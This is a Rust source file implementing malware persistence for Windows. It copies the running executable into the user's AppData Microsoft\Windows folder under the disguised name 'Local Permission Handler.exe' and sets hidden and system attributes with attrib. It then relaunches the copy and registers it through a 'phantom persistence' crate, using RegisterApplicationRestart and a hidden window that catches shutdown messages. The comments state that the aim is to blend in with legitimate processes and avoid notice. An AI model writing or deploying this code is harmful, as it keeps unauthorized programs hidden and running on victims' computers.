use std::env;
use std::fs;
use std::path::PathBuf;
use std::process::Command;

/// Masqueraded name that blends in with legitimate Windows processes.
/// Chosen so it looks plausible inside the AppData\Microsoft\Windows folder.
const MASQUERADE_NAME: &str = "Local Permission Handler.exe";

/// Returns the path where the persistent copy should live.
pub fn target_path() -> Option<PathBuf> {
    let appdata = env::var("APPDATA").ok()?;
    Some(
        PathBuf::from(appdata)
            .join("Microsoft")
            .join("Windows")
            .join(MASQUERADE_NAME),
    )
}

/// Returns true if the current process is already running from the
/// persistent location. Used to avoid copying ourselves in a loop.
pub fn is_running_from_target() -> bool {
    let current = match env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };
    let target = match target_path() {
        Some(p) => p,
        None => return false,
    };
    // Canonicalize both so path normalization (short names, 8.3, etc.)
    // doesn't cause a false negative.
    let current = fs::canonicalize(&current).unwrap_or(current);
    let target = fs::canonicalize(&target).unwrap_or(target);
    current == target
}

/// Copy the running stub to the persistent location and launch it.
/// The original process exits after spawning the copy.
pub fn install_and_launch() -> Result<(), String> {
    let current = env::current_exe()
        .map_err(|e| format!("current_exe: {}", e))?;

    let target = target_path()
        .ok_or_else(|| "APPDATA not set".to_string())?;

    // Ensure the directory exists.
    if let Some(parent) = target.parent() {
        fs::create_dir_all(parent)
            .map_err(|e| format!("create_dir_all: {}", e))?;
    }

    // Copy the running executable to the target path.
    // If the target already exists, overwrite it — the copy step is
    // idempotent and we always want the newest version in place.
    fs::copy(&current, &target)
        .map_err(|e| format!("copy self: {}", e))?;

    // Optional: set the hidden attribute so the file doesn't show up
    // in a plain `dir` listing. `attrib` is present on every Windows.
    let _ = Command::new("attrib")
        .args(["+h", "+s"])
        .arg(&target)
        .status();

    // Launch the copy. It will detect it's running from the target path
    // and take the "persistence" branch on startup.
    Command::new(&target)
        .spawn()
        .map_err(|e| format!("spawn copy: {}", e))?;

    Ok(())
}

/// Register the current process (which is the copy) for Phantom
/// Persistence. Called only when running from the target path.
pub fn register_persistence() {
    // These are the two calls from the phantom_persist_rs crate.
    // register_application_restart registers the current process for
    // restart via RegisterApplicationRestart (ETW-friendly, no registry).
    // message_loop_thread runs the hidden window that intercepts
    // WM_QUERYENDSESSION and forces the restart on shutdown.
    phantom_persist_rs::register_application_restart();
    std::thread::spawn(|| {
        phantom_persist_rs::message_loop_thread();
    });
}